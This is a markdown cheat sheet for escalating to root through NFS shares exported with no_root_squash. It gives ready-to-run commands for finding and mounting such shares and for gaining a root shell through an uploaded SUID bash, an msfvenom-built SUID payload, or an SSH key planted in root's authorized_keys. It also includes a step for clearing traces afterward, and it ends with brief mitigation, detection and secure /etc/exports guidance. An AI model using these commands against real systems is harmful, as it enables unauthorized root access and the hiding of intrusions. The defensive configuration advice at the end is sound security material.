# **NFS Privilege Escalation Cheat Sheet**

## **1. Identifying Vulnerable NFS Shares**
```bash
# Scan for NFS services
nmap -p 111,2049 <target_IP>

# List available shares
showmount -e <target_IP>
```

### **Key Findings**
```
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
- **`no_root_squash`** → Critical vulnerability (allows root access)
- **`rw`** → Read-write access for all clients

## **2. Exploitation Steps**

### **A. Mounting the Share**
```bash
# Create local mount point
sudo mkdir /mnt/nfs

# Mount with NFSv3 (most compatible)
sudo mount -o rw,vers=3 <target_IP>:/tmp /mnt/nfs
```

### **B. Verify Write Access**
```bash
# Test as normal user
echo "test" > /mnt/nfs/test_user.txt

# Test as root (should work due to no_root_squash)
sudo bash -c 'echo "root_test" > /mnt/nfs/test_root.txt'
```

## **3. Privilege Escalation Methods**

### **Method 1: SUID Binary Upload**
```bash
# On attacker machine (as root)
cp /bin/bash /mnt/nfs/
chmod +xs /mnt/nfs/bash

# On target machine
/tmp/bash -p  # Get root shell
```
*Note: May fail due to library dependencies*

### **Method 2: MSFVenom Payload**
```bash
# Generate SUID shell
msfvenom -p linux/x64/exec CMD="/bin/sh" -f elf > /mnt/nfs/shell
chmod +xs /mnt/nfs/shell

# On target machine
/tmp/shell  # Instant root
```

### **Method 3: SSH Key Planting**
```bash
# Generate key pair
ssh-keygen -f nfs_key

# Add to root's authorized_keys
mkdir -p /mnt/nfs/root/.ssh
cat nfs_key.pub >> /mnt/nfs/root/.ssh/authorized_keys
chmod 700 /mnt/nfs/root/.ssh

# SSH in
ssh -i nfs_key root@<target_IP>
```

## **4. Post-Exploitation**
```bash
# Clean traces
rm /mnt/nfs/{shell,bash,test_*.txt}

# Unmount share
sudo umount /mnt/nfs
```

## **5. Mitigation**
- **Never use `no_root_squash`** in `/etc/exports`
- Restrict shares to specific IPs:  
  `/tmp 192.168.1.100(rw,sync,root_squash)`
- Use `all_squash` for anonymous access:  
  `/tmp *(rw,sync,all_squash)`

## **Detection & Monitoring**
```bash
# Check active NFS mounts
mount | grep nfs

# Monitor NFS access
tail -f /var/log/syslog | grep nfsd
```

## **Reference**
```bash
# Sample vulnerable /etc/exports
/tmp *(rw,sync,no_root_squash,no_subtree_check)  # NEVER USE THIS

# Secure configuration
/tmp 192.168.1.0/24(rw,sync,root_squash,subtree_check)
```

